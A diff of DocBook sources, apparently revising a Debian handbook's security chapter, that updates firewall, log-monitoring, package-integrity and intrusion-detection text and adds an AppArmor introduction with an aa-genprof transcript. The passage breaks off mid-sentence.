@@ -154,7 +154,6 @@
     <title>Firewall or Packet Filtering</title>
     <indexterm><primary>firewall</primary></indexterm>
     <indexterm><primary>packet filter</primary></indexterm>
-    <indexterm><primary>firewall</primary></indexterm>
 
     <sidebar>
       <title><emphasis>BACK TO BASICS</emphasis> Firewall</title>
@@ -300,9 +299,10 @@
 	buffer, proposes a better route for the next packets in the
 	connection, and so on. This protocol is defined by several RFC
 	documents; the initial RFC777 and RFC792 were soon completed and
-	extended. <ulink type="block"
-	url="http://www.faqs.org/rfcs/rfc777.html"/><ulink type="block"
-	url="http://www.faqs.org/rfcs/rfc792.html"/></para>
+        extended.
+        <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html"/>
+        <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html"/>
+        </para>
 
 	<para>For reference, a receive buffer is a small memory zone
 	storing data between the time it arrives from the network and the
@@ -369,30 +369,25 @@
         </listitem>
         <listitem>
 	  <para><literal>SNAT</literal> (only in the
-	  <literal>nat</literal> table, therefore only in IPv4 on
-	  <emphasis role="distribution">Wheezy</emphasis> — NAT
-	  support for IPv6 appeared in the Linux 3.7 kernel): apply
+	  <literal>nat</literal> table): apply
 	  <emphasis>Source NAT</emphasis> (extra options describe the
 	  exact changes to apply);</para>
         </listitem>
         <listitem>
 	  <para><literal>DNAT</literal> (only in the
-	  <literal>nat</literal> table, therefore only in IPv4 on
-	  <emphasis role="distribution">Wheezy</emphasis>): apply
+	  <literal>nat</literal> table): apply
 	  <emphasis>Destination NAT</emphasis> (extra options describe
 	  the exact changes to apply);</para>
         </listitem>
         <listitem>
 	  <para><literal>MASQUERADE</literal> (only in the
-	  <literal>nat</literal> table, therefore only in IPv4 on
-	  <emphasis role="distribution">Wheezy</emphasis>): apply
+	  <literal>nat</literal> table): apply
 	  <emphasis>masquerading</emphasis> (a special case of
 	  <emphasis>Source NAT</emphasis>);</para>
         </listitem>
         <listitem>
 	  <para><literal>REDIRECT</literal> (only in the
-	  <literal>nat</literal> table, therefore only in IPv4 on
-	  <emphasis role="distribution">Wheezy</emphasis>): redirect a
+	  <literal>nat</literal> table): redirect a
 	  packet to a given port of the firewall itself; this can be
 	  used to set up a transparent web proxy that works with no
 	  configuration on the client side, since the client thinks it
@@ -540,9 +535,7 @@
 	to indicate the new source IP address and/or port.</para>
 
 	<para>The <literal>REDIRECT</literal> action (only available
-	if NAT is available — on <emphasis
-	role="distribution">Wheezy</emphasis>, this means IPv4 only)
-	provides the <literal>--to-ports
+	if NAT is available) provides the <literal>--to-ports
 	<replaceable>port(s)</replaceable></literal> option to
 	indicate the port, or port range, where the packets should be
 	redirected.</para>
@@ -561,6 +554,9 @@
 
       <!-- TODO: add sidebar to present non-graphical helper tools like
 	   ferm: http://ferm.foo-projects.org -->
+      <screen>
+<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput>
+</screen>
 
       <para>The principle is simple. In the first step, one needs to
       describe all the elements that will be involved in the actual
@@ -608,25 +604,9 @@
       Linux, <command>ipf</command> for FreeBSD and
       <command>pf</command> for OpenBSD).</para>
 
-      <para>Versions of the <emphasis role="pkg">fwbuilder</emphasis>
-      package since <emphasis role="distribution">Squeeze</emphasis>
-      contain both the graphical interface and the modules for each
-      firewall system (these were previously split over several packages,
-      one for each target system):</para>
-
-      <screen>
-<computeroutput># </computeroutput><userinput>aptitude install fwbuilder</userinput>
-</screen>
     </section>
     <section id="sect.install-rules-at-boot">
       <title>Installing the Rules at Each Boot</title>
-
-      <para>If the firewall is meant to protect an intermittent PPP network
-      connection, the simplest way to deploy the script is to install it as
-      <filename>/etc/ppp/ip-up.d/0iptables</filename> (note that only files
-      without a dot in their name are taken into account). The firewall
-      will thus be reloaded every time a PPP connection is
-      established.</para>
 
       <para>In other cases, the recommended way is to register the
       configuration script in an <literal>up</literal> directive of the
@@ -646,11 +626,19 @@ iface eth0 inet static
     up /usr/local/etc/arrakis.fw
 </programlisting>
       </example>
+      <para>This obviously assumes that you are using <emphasis
+          role="pkg">ifupdown</emphasis> to configure the network
+        interfaces. If you are using something else (like
+        <emphasis>NetworkManager</emphasis> or
+        <emphasis>systemd-networkd</emphasis>), then refer to their
+        respective documentation to find out ways to execute a script
+        after the interface has been brought up.
+      </para>
+
     </section>
   </section>
   <section id="sect.supervision">
     <title>Supervision: Prevention, Detection, Deterrence</title>
-    <indexterm><primary>monitoring</primary></indexterm>
     <indexterm><primary>monitoring</primary></indexterm>
 
     <para>Monitoring is an integral part of any security policy for several
@@ -677,7 +665,7 @@ iface eth0 inet static
 
       <para>The list of monitored files is stored in
       <filename>/etc/logcheck/logcheck.logfiles</filename>; the default
-      values work fine if the <filename>/etc/syslog.conf</filename> file
+      values work fine if the <filename>/etc/rsyslog.conf</filename> file
       has not been completely overhauled.</para>
 
       <para><command>logcheck</command> can work in one of three more or
@@ -739,22 +727,6 @@ iface eth0 inet static
       directories states the event should be ignored. Of course, the only
       directories taken into account are those corresponding to verbosity
       levels equal or greater than the selected operation mode.</para>
-
-      <sidebar>
-        <title><emphasis>TIP</emphasis> Your logs as screen background</title>
-
-	<para>Some administrators like seeing their log messages scroll by
-	in real time; the <command>root-tail</command> command (in the
-	<emphasis role="pkg">root-tail</emphasis>) package can be used to
-	integrate the logs into the background of their graphical desktop.
-	The <command>xconsole</command> program (in the
-	<emphasis>x11-apps</emphasis> package) can also have them scrolling
-	in a small window. Messages are directly taken from
-	<command>syslogd</command> via the
-	<filename>/dev/xconsole</filename> named pipe.</para>
-        <indexterm><primary><command>root-tail</command></primary></indexterm>
-        <indexterm><primary>logs</primary><secondary>display</secondary></indexterm>
-      </sidebar>
     </section>
     <section id="sect.monitoring-activity">
       <title>Monitoring Activity</title>
@@ -789,9 +761,8 @@ iface eth0 inet static
 	page gives details on how to customize its display and adapt it to
 	one's personal needs and habits.</para>
 
-	<para>The <command>gnome-system-monitor</command> and
-	<command>qps</command> graphical tools are similar to
-	<command>top</command> and they provide roughly the same
+        <para>The <command>gnome-system-monitor</command> graphical tool
+        is similar to <command>top</command> and it provides roughly the same
 	features.</para>
 
         <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
@@ -852,14 +823,13 @@ iface eth0 inet static
       would therefore be worth investigating. This section presents a few
       tools able to monitor files and to warn the administrator when an
       unexpected change occurs (or simply to list such changes).</para>
-      <section id="sect.debsums">
-        <title>Auditing Packages: <command>debsums</command> and its Limits</title>
-        <indexterm><primary><command>debsums</command></primary></indexterm>
-
+      <section id="sect.dpkg-verify">
+        <title>Auditing Packages with <command>dpkg --verify</command></title>
+        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
         <sidebar>
           <title><emphasis>GOING FURTHER</emphasis> Protecting against upstream changes</title>
 
-	  <para><command>debsums</command> is useful in detecting changes
+	  <para><command>dpkg --verify</command> is useful in detecting changes
 	  to files coming from a Debian package, but it will be useless if
 	  the package itself is compromised, for instance if the Debian
 	  mirror is compromised. Protecting against this class of attacks
@@ -868,68 +838,91 @@ iface eth0 inet static
 	  to only install packages from a certified origin.</para>
         </sidebar>
 
-	<para><command>debsums</command> is an interesting tool since it
-	allows finding what installed files have been modified (potentially
-	by an attacker), but this should be taken with a grain of salt.
-	First, because not all Debian packages provide the fingerprints
-	required by this program (they can be found in
-	<filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>
-	when they exist).
-	<indexterm><primary>fingerprint</primary></indexterm>
-	<indexterm><primary>control sum</primary></indexterm>
-	<indexterm><primary>MD5</primary></indexterm>
-	<indexterm><primary>SHA1</primary></indexterm> As a reminder: a
-	fingerprint is a value, often a number (even though in hexadecimal
-	notation), that contains a kind of signature for the contents of a
-	file. This signature is calculated with an algorithm (MD5 or SHA1
-	being well-known examples) that more or less guarantee that even
-	the tiniest change in the file contents implies a change in the
-	fingerprint; this is known as the “avalanche effect”. This
-	allows a simple numerical fingerprint to serve as a litmus test to
-	check whether the contents of a file have been altered. These
-	algorithms are not reversible; in other words, for most of them,
-	knowing a fingerprint doesn't allow finding the corresponding
-	contents. Recent mathematical advances seem to weaken the
-	absoluteness of these principles, but their use is not called into
-	question so far, since creating different contents yielding the
-	same fingerprint still seems to be quite a difficult task.</para>
+        <para><command>dpkg --verify</command> (or <command>dpkg
+            -V</command>) is an interesting tool since it allows finding
+          what installed files have been modified (potentially by an
+          attacker), but this should be taken with a grain of salt.  To do
+          its job it relies on checksums stored in dpkg's own database
+          which is stored on the hard disk (they can be found in
+          <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>);
+          a thorough attacker will therefore update these files so they
+          contain the new checksums for the subverted files.
+        </para>
 
-	<para>In addition, the <filename>md5sums</filename> files are
-	stored on the hard disk; a thorough attacker will therefore update
-	these files so they contain the new control sums for the subverted
-	files.</para>
+        <sidebar>
+          <title><emphasis>BACK TO BASICS</emphasis> File fingerprint</title>
+	  <indexterm><primary>fingerprint</primary></indexterm>
+	  <indexterm><primary>control sum</primary></indexterm>
+	  <indexterm><primary>MD5</primary></indexterm>
+	  <indexterm><primary>SHA1</primary></indexterm> 
+          <para>As a reminder: a
+          fingerprint is a value, often a number (even though in hexadecimal
+          notation), that contains a kind of signature for the contents of a
+          file. This signature is calculated with an algorithm (MD5 or SHA1
+          being well-known examples) that more or less guarantee that even
+          the tiniest change in the file contents implies a change in the
+          fingerprint; this is known as the “avalanche effect”. This
+          allows a simple numerical fingerprint to serve as a litmus test to
+          check whether the contents of a file have been altered. These
+          algorithms are not reversible; in other words, for most of them,
+          knowing a fingerprint doesn't allow finding the corresponding
+          contents. Recent mathematical advances seem to weaken the
+          absoluteness of these principles, but their use is not called into
+          question so far, since creating different contents yielding the
+          same fingerprint still seems to be quite a difficult task.
+          </para>
+        </sidebar>
 
-	<para>The first drawback can be avoided by asking
-	<command>debsums</command> to base its checks on a
-	<filename>.deb</filename> package instead of relying on the
-	<filename>md5sums</filename> file. But that requires downloading the
-	matching <filename>.deb</filename> files first:</para>
-
+        <para>Running <command>dpkg -V</command> will verify all installed
+          packages and will print out a line for each file with a failing
+          test. The output format is the same as the one of <command>rpm
+            -V</command> where each character denotes a test on some
+          specific meta-data. Unfortunately <command>dpkg</command> does
+          not store the meta-data needed for most tests and will thus
+          output question marks for them. Currently only the checksum test
+          can yield a "5" on the third character (when it fails).
+        </para>
         <screen>
-<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `debsums -l`</userinput>
-<computeroutput>[ ... ]
-# </computeroutput><userinput>debsums -p /var/cache/apt/archives -g</userinput>
-      </screen>
+<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
+<computeroutput>??5??????   /lib/systemd/system/ssh.service
+??5?????? c /etc/libvirt/qemu/networks/default.xml
+??5?????? c /etc/lvm/lvm.conf
+??5?????? c /etc/salt/roster</computeroutput>
+</screen>
+        <para>In the sample above, dpkg reports a change to SSH's service file
+        that the administrator made to the packaged file instead of using
+        an appropriate <filename>/etc/systemd/system/ssh.service</filename>
+        override. It also lists multiple configuration files (identified by
+        the "c" letter on the second field) that had been legitimately
+        modified.</para>
+      </section>
 
-	<para>It is also worth noting that, in its default configuration,
-	<command>debsums</command> automatically generates the missing
-	<filename>md5sums</filename> files whenever a package is installed
-	using APT.</para>
+      <section id="sect.debsums">
+        <title>Auditing Packages: <command>debsums</command> and its Limits</title>
+        <indexterm><primary><command>debsums</command></primary></indexterm>
 
-	<para>The other problem can be avoided in a similar fashion: the
-	check must simply be based on a pristine <filename>.deb</filename>
-	file. Since this implies having all the <filename>.deb</filename>
-	files for all the installed packages, and being sure of their
-	integrity, the simplest way is to grab them from a Debian mirror.
-	This operation can be slow and tedious, and should therefore not be
-	considered a proactive technique to be used on a regular
-	basis.</para>
+        <para>
+          <command>debsums</command> is the ancestor of <command>dpkg -V</command>
+          and is thus mostly obsolete. It suffers from the same limitations than
+          dpkg. Fortunately, some of the limitations can be worked-around (whereas dpkg
+          does not offer similar work-arounds).
+        </para>
+
+        <para>
+          Since the data on the disk cannot be trusted, <command>debsums</command>
+          offers to do its checks based on <filename>.deb</filename> files instead of
+          relying on dpkg's database. To download trusted <filename>.deb</filename> files
+          of all the packages installed, we can rely on APT's authenticated downloads.
+	  This operation can be slow and tedious, and should therefore not be
+	  considered a proactive technique to be used on a regular
+          basis.
+        </para>
 
         <screen>
 <computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
 <computeroutput>[ ... ]
 # </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput>
-      </screen>
+</screen>
 
 	<para>Note that this example uses the
 	<command>grep-status</command> command from the <emphasis
@@ -1053,26 +1046,70 @@ iface eth0 inet static
 	attack is distributed or not).</para>
       </sidebar>
 
-      <para><command>snort</command> (in the Debian package of the same
+      <para><command>suricata</command> (in the Debian package of the same
       name) is a NIDS — a <emphasis>Network Intrusion Detection
       System</emphasis>. Its function is to listen to the network and try
       to detect infiltration attempts and/or hostile acts (including denial
-      of service attacks). All these events are logged, and a daily email
-      is sent to the administrator with a summary of the past 24
-      hours.</para>
+      of service attacks). All these events are logged in multiple files
+      in <filename>/var/log/suricata</filename>. There are third party tools
+      (Kibana/logstash) to better browse all the data collected.
+      <ulink type="block" url="http://suricata-ids.org"/>
+      <ulink type="block" url="https://www.elastic.co/products/kibana"/>
+      </para>
       <indexterm><primary><command>snort</command></primary></indexterm>
+      <indexterm><primary><command>suricata</command></primary></indexterm>
 
-      <para>Its configuration requires describing the range of addresses
-      that the local network covers. In practice, this means the set of all
-      potential attack targets. Other important parameters can be
-      configured with <command>dpkg-reconfigure snort</command>, including
-      the network interface to monitor. This will often be
-      <literal>eth0</literal> for an Ethernet connection, but other
-      possibilities exist such as <literal>ppp0</literal> for an ADSL or
-      PSTN (<emphasis>Public Switched Telephone Network</emphasis>, or good
-      old dialup modem), or even <literal>wlan0</literal> for some wireless
-      network cards.</para>
+      <sidebar>
+        <title><emphasis>CAUTION</emphasis> Range of action</title>
 
+	<para>The effectiveness of <command>suricata</command> is limited by
+	the traffic seen on the monitored network interface. It will
+	obviously not be able to detect anything if it cannot observe the
+	real traffic. When plugged into a network switch, it will therefore
+	only monitor attacks targeting the machine it runs on, which is
+	probably not the intention. The machine hosting
+	<command>suricata</command> should therefore be plugged into the
+	“mirror” port of the switch, which is usually dedicated to
+	chaining switches and therefore gets all the traffic.</para>
+      </sidebar>
+
+      <para>
+        Configuring suricata involves reviewing and editing
+        <filename>/etc/suricata/suricata-debian.yaml</filename>, which is
+        very long because because each parameter is abundantly commented.
+        A minimal configuration requires describing the range of addresses
+        that the local network covers (<literal>HOME_NET</literal>
+        parameter). In practice, this means the set of all potential
+        attack targets. But getting the most of it requires reading it in
+        full and adapting it to the local situation.
+      </para>
+      <para>
+        On top of this, you should also edit
+        <filename>/etc/default/suricata</filename> to define the network
+        interface to monitor and to enable the init script (by setting
+        <literal>RUN=yes</literal>). You might also want to set
+        <literal>LISTENMODE=pcap</literal> because the default
+        <literal>LISTENMODE=nfqueue</literal> requires further configuration
+        to work properly (the netfilter firewall must be configured to
+        pass packets to some userspace queue handled by suricata via the
+        <literal>NFQUEUE</literal> target).
+      </para>
+      <para>
+        To detect bad behaviour, <command>suricata</command> needs a set of
+        monitoring rules: you can find such rules in the
+        <emphasis role="pkg">snort-rules-default</emphasis> package.
+        <command>snort</command> is the historical reference in the IDS
+        ecosystem and <command>suricata</command> is able to reuse rules
+        written for it.  Unfortunately that package is missing from
+        <emphasis role="distribution">Debian Jessie</emphasis> and should
+        be retrieved from another Debian release like <emphasis
+          role="distribution">Testing</emphasis> or <emphasis
+          role="distribution">Unstable</emphasis>.
+      </para>
+      <para>
+        Alternatively, <command>oinkmaster</command> (in the package of the same name)
+        can be used to download Snort rulesets from external sources.
+      </para>
       <sidebar>
         <title><emphasis>GOING FURTHER</emphasis> Integration with <command>prelude</command></title>
 
@@ -1082,46 +1119,401 @@ iface eth0 inet static
 	role="pkg">prelude-manager</emphasis>) which gathers alerts
 	generated by <emphasis>sensors</emphasis> of various types.</para>
 
-	<para>Snort can be configured as such a sensor. Other possibilities
+	<para>Suricata can be configured as such a sensor. Other possibilities
 	include <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor
 	Lackey</emphasis>) which monitors log files (in a manner similar to
 	<command>logcheck</command>, described in <xref
 	linkend="sect.logcheck"/>).</para>
         <indexterm><primary><command>prelude</command></primary></indexterm>
       </sidebar>
-
-      <para>The <command>snort</command> configuration file
-      (<filename>/etc/snort/snort.conf</filename>) is very long, and the
-      abundant comments describe each directive with much detail. Getting
-      the most out of it requires reading it in full and adapting it to the
-      local situation. For instance, indicating which machine hosts which
-      service can limit the number of incidents <command>snort</command>
-      will report, since a denial of service attack on a desktop machine is
-      far from being as critical as one on a DNS server. Another
-      interesting directive allows storing the mappings between IP
-      addresses and MAC addresses (these uniquely identify a network card),
-      so as to allow detecting <emphasis>ARP spoofing</emphasis> attacks by
-      which a compromised machine attempts to masquerade as another such as
-      a sensitive server.</para>
-
-      <sidebar>
-        <title><emphasis>CAUTION</emphasis> Range of action</title>
-
-	<para>The effectiveness of <command>snort</command> is limited by
-	the traffic seen on the monitored network interface. It will
-	obviously not be able to detect anything if it cannot observe the
-	real traffic. When plugged into a network switch, it will therefore
-	only monitor attacks targeting the machine it runs on, which is
-	probably not the intention. The machine hosting
-	<command>snort</command> should therefore be plugged into the
-	“mirror” port of the switch, which is usually dedicated to
-	chaining switches and therefore gets all the traffic.</para>
-
-	<para>On a small network based around a network hub, there is no
-	such problem, since all machines get all the traffic.</para>
-      </sidebar>
     </section>
   </section>
+  <section id="sect.apparmor">
+    <title>Introduction to AppArmor</title>
+    <indexterm><primary>AppArmor</primary></indexterm>
+    <section id="sect.apparmor-principles">
+      <title>Principles</title>
+      <para>
+        AppArmor is a <emphasis>Mandatory Access Control</emphasis> (MAC)
+        system built on Linux's LSM (<emphasis>Linux Security
+          Modules</emphasis>) interface. In practice, the kernel queries
+        AppArmor before each system call to know whether the process is
+        authorized to do the given operation. Through this mechanism, AppArmor
+        confines programs to a limited set of resources.
+      </para>
+      <indexterm><primary><emphasis>Mandatory Access Control</emphasis></primary></indexterm>
+      <indexterm><primary><emphasis>Linux Security Modules</emphasis></primary></indexterm>
+      <para>
+        AppArmor applies a set of rules (known as “profile”) on each
+        program. The profile applied by the kernel depends on the
+        installation path of the program being executed.
+        Contrary to SELinux (discussed in <xref linkend="sect.selinux" />),
+        the rules applied do not depend on the user. All users 
+        face the same set of rules when they are executing the same
+        program (but traditional user permissions still apply and
+        might result in different behaviour!).
+      </para>
+      <para>
+        AppArmor profiles are stored in <filename>/etc/apparmor.d/</filename>
+        and they contain a list of access control rules on resources that
+        each program can make use of.
+        The profiles are compiled and loaded into the kernel by the
+        <command>apparmor_parser</command> command. Each profile can
+        be loaded either in enforcing or complaining mode. The former
+        enforces the policy and reports violation attempts, while the
+        latter does not enforce the policy but still logs the system
+        calls that would have been denied.
+      </para>
+    </section>
+    <section id="sect.apparmor-setup">
+      <title>Enabling AppArmor and managing AppArmor profiles</title>
+      <para>
+        AppArmor support is built into the standard kernels provided by Debian.
+        Enabling AppArmor is thus just a matter of installing a few
+        packages and adding some parameters to the kernel command line:
+      </para>
+      <screen>
+<computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils</userinput>
+[...]
+<computeroutput># </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub</userinput>
+<computeroutput># </computeroutput><userinput>update-grub</userinput>
+      </screen>
+      <para>
+        After a reboot, AppArmor is now functional and <command>aa-status</command>
+        will confirm it quickly:
+      </para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-status</userinput>
+<computeroutput>apparmor module is loaded.
+44 profiles are loaded.
+9 profiles are in enforce mode.
+   /usr/bin/lxc-start
+   /usr/lib/chromium-browser/chromium-browser//browser_java
+[...]
+35 profiles are in complain mode.
+   /sbin/klogd
+[...]
+3 processes have profiles defined.
+1 processes are in enforce mode.
+   /usr/sbin/libvirtd (1295) 
+2 processes are in complain mode.
+   /usr/sbin/avahi-daemon (941) 
+   /usr/sbin/avahi-daemon (1000) 
+0 processes are unconfined but have a profile defined.</computeroutput>
+</screen>
+      <sidebar>
+        <title><emphasis>NOTE</emphasis> More AppArmor profiles</title>
+        <para>
+          The <emphasis role="pkg">apparmor-profiles</emphasis> package
+          contains profiles managed by the upstream AppArmor community.
+          To get even more profiles you can install
+          <emphasis role="pkg">apparmor-profiles-extra</emphasis> which
+          contains profiles developed by Ubuntu and Debian.
+        </para>
+      </sidebar>
+      <para>
+        The state of each profile can be switched between
+        enforcing and complaining with calls to <command>aa-enforce</command>
+        and <command>aa-complain</command> giving as parameter either
+        the path of the executable or the patch to the policy file.
+        Additionnaly a profile can be entirely disabled with
+        <command>aa-disable</command> or put in audit mode (to log
+        accepted system calls too) with <command>aa-audit</command>.
+      </para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
+<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
+<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
+<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
+      </screen>
+    </section>
+    <section id="sect.apparmor-new-profile">
+      <title>Creating a new profile</title>
+      <para>
+        Even though creating an AppArmor profile is rather easy, most
+        programs do not have one. This section will show you how to
+        create a new profile from scratch just by using the target
+        program and letting AppArmor monitor the system call it makes
+        and the resources it accesses.
+      </para>
+      <para>
+        The most important programs that need to be confined
+        are the network facing programs as those are the most likely
+        targets of remote attackers. That is why AppArmor conveniently
+        provides an <command>aa-unconfined</command> command to list
+        the programs which have no associated profile and which expose
+        an open network socket. With the <literal>--paranoid</literal>
+        option you get all unconfined processes that have at least one
+        active network connection.
+      </para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
+<computeroutput>801 /sbin/dhclient not confined
+890 /sbin/rpcbind not confined
+899 /sbin/rpc.statd not confined
+929 /usr/sbin/sshd not confined
+941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
+988 /usr/sbin/minissdpd not confined
+1276 /usr/sbin/exim4 not confined
+1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
+1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
+19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
+      </screen>
+      <para>
+        In the following example, we will thus try to create a
+        profile for <command>/sbin/dhclient</command>. For this
+        we will use <command>aa-genprof dhclient</command>. It
+        will invite you to use the application in another windown
+        and when done to come back to <command>aa-genprof</command>
+        to scan for AppArmor events in the system logs and
+        convert those logs into access rules. For each logged event,
+        it will make one or more rule suggestions that you can
+        either approve or further edit in multiple ways:
+      </para>
+      <screen>
+<computeroutput>#</computeroutput><userinput>aa-genprof dhclient</userinput>
+<computeroutput>Writing updated profile for /sbin/dhclient.
+Setting /sbin/dhclient to complain mode.
+
+Before you begin, you may wish to check if a
+profile already exists for the application you
+wish to confine. See the following wiki page for
+more information:
+http://wiki.apparmor.net/index.php/Profiles
+
+Please start the application to be profiled in
+another window and exercise its functionality now.
+
+Once completed, select the "Scan" option below in 
+order to scan the system logs for AppArmor events. 
+
+For each AppArmor event, you will be given the 
+opportunity to choose whether the access should be 
+allowed or denied.
+
+Profiling: /sbin/dhclient
+
+[(S)can system log for AppArmor events] / (F)inish
+Reading log entries from /var/log/audit/audit.log.
+
+Profile:  /sbin/dhclient <co id="aa-genprof-execute"/>
+Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
+Severity: unknown
+
+(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
+<userinput>P</userinput>
+Should AppArmor sanitise the environment when
+switching profiles?
+
+Sanitising environment is more secure,
+but some applications depend on the presence
+of LD_PRELOAD or LD_LIBRARY_PATH.
+
+(Y)es / [(N)o]
+<userinput>Y</userinput>
+Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
+Complain-mode changes:
+WARN: unknown capability: CAP_net_raw
+
+Profile:    /sbin/dhclient <co id="aa-genprof-capability"/>
+Capability: net_raw
+Severity:   unknown
+
+[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
+<userinput>A</userinput>
+Adding capability net_raw to profile.
+
+Profile:  /sbin/dhclient <co id="aa-genprof-read"/>
+Path:     /etc/nsswitch.conf
+Mode:     r
+Severity: unknown
+
+  1 - #include &lt;abstractions/apache2-common&gt; 
+  2 - #include &lt;abstractions/libvirt-qemu&gt; 
+  3 - #include &lt;abstractions/nameservice&gt; 
+  4 - #include &lt;abstractions/totem&gt; 
+ [5 - /etc/nsswitch.conf]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>3</userinput>
+
+Profile:  /sbin/dhclient
+Path:     /etc/nsswitch.conf
+Mode:     r
+Severity: unknown
+
+  1 - #include &lt;abstractions/apache2-common&gt; 
+  2 - #include &lt;abstractions/libvirt-qemu&gt; 
+ [3 - #include &lt;abstractions/nameservice&gt;]
+  4 - #include &lt;abstractions/totem&gt; 
+  5 - /etc/nsswitch.conf 
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding #include &lt;abstractions/nameservice&gt; to profile.
+
+Profile:  /sbin/dhclient
+Path:     /proc/7252/net/dev
+Mode:     r
+Severity: 6
+
+  1 - /proc/7252/net/dev 
+ [2 - /proc/*/net/dev]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /proc/*/net/dev r to profile
+
+[...]
+Profile:  /sbin/dhclient <co id="aa-genprof-write"/>
+Path:     /run/dhclient-eth0.pid
+Mode:     w
+Severity: unknown
+
+ [1 - /run/dhclient-eth0.pid]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>N</userinput>
+
+Enter new path: /run/dhclient*.pid
+
+Profile:  /sbin/dhclient
+Path:     /run/dhclient-eth0.pid
+Mode:     w
+Severity: unknown
+
+  1 - /run/dhclient-eth0.pid 
+ [2 - /run/dhclient*.pid]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /run/dhclient*.pid w to profile
+
+[...]
+Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"/>
+Path:     /proc/filesystems
+Mode:     r
+Severity: 6
+
+ [1 - /proc/filesystems]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /proc/filesystems r to profile
+
+= Changed Local Profiles =
+
+The following local profiles were changed. Would you like to save them?
+
+ [1 - /sbin/dhclient]
+  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
+(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
+<userinput>S</userinput>
+Writing updated profile for /sbin/dhclient.
+Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
+
+Profiling: /sbin/dhclient
+
+[(S)can system log for AppArmor events] / (F)inish
+<userinput>F</userinput>
+Setting /sbin/dhclient to enforce mode.
+Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.
+
+Reloaded AppArmor profiles in enforce mode.
+
+Please consider contributing your new profile!
+See the following wiki page for more information:
+http://wiki.apparmor.net/index.php/Profiles
+
+Finished generating profile for /sbin/dhclient.</computeroutput>
+</screen>
+      <para>
+        Note that the program does not display back the control
+        characters that you type but for the clarity of the explanation I
+        have included them in the previous transcript.
+      </para>
+      <calloutlist>
+        <callout arearefs="aa-genprof-execute">
+          <para>
+            The first event detected is the execution of another program.
+            In that case, you have multiple choices: you can run the program
+            with the profile of the parent process (the “Inherit” choice),
+            you can run it with its own dedicated profile (the
+            “Profile” and the “Named” choices, differing only by the
+            possibility to use an arbitrary profile name), you can run it
+            with a sub-profile of the parent process (the “Child” choice),
+            you can run it without any profile (the “Unconfined” choice)
+            or you can decide to not run it at all (the “Deny” choice).
+          </para>
+          <para>
+            Note that when you opt to run it under a dedicated profile
+            that doesn't exist yet, the tool will create the missing profile
+            for you and will make rule suggestions for that profile in the
+            same run.
+          </para>
+        </callout>
+        <callout arearefs="aa-genprof-capability">
+          <para>
+            At the kernel level, the special powers of the root user have been split
+            in “capabilities”. When a system call requires a specific capability,
+            AppArmor will verify whether the profile allows the program to make
+            use of this capability.
+          </para>
+        </callout>
+        <callout arearefs="aa-genprof-read">
+          <para>
+            Here the program seeks read permissions for
+            <filename>/etc/nsswitch.conf</filename>. <command>aa-genprof</command>
+            detected that this permission was also granted by multiple
+            “abstractions” and offers them as alternative choices. An
+            abstraction provides a reusable set of access rules grouping
+            together multiple resources that are commonly used together.
+            In this specific case, the file is generally accessed through
+            the nameservice related functions of the C library and we type
+            “3” to first select the “#include
+            &lt;abstractions/nameservice&gt;” choice and then “A” to allow
+            it.
+          </para>
+        </callout>
+        <callout arearefs="aa-genprof-write">
+          <para>
+            The program wants to create the <filename>/run/dhclient-eth0.pid</filename>
